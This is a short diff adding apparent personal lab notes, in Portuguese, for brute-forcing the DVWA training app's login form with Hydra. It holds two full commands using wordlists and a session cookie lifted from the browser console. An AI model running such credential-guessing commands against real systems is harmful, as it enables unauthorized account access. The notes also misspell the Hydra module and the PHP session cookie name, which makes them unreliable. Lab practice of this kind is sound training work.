@@ -1,0 +1,15 @@
+hydra -v -L user.txt -P pass.txt 192.168.15.39 http-ger-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
+
+#PADRAO DE LOGIN E SENHA:
+#^USER^
+#^PASS^
+#Exemplo URL utilizada: 
+#METODO GET
+#http://192.168.15.39/dvwa/vulnerabilities/brute/?username=ddd&password=sss&Login=Login#
+
+#Quando a aplicação informa que todas as senhas estão corretas, é necessario passar o header do cookie
+#Informar no final do comando, o :H=Cookie:$Cookie
+#O $Cookie, pode ser coletado via "Dev Tools do browserm na aba console:
+#document.cookie (Coletar o PHPSESSION=COKKIE)"
+
+hydra -v -L user.txt -P pass.txt 192.168.15.39 http-ger-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSION=COOKIE; security=low"
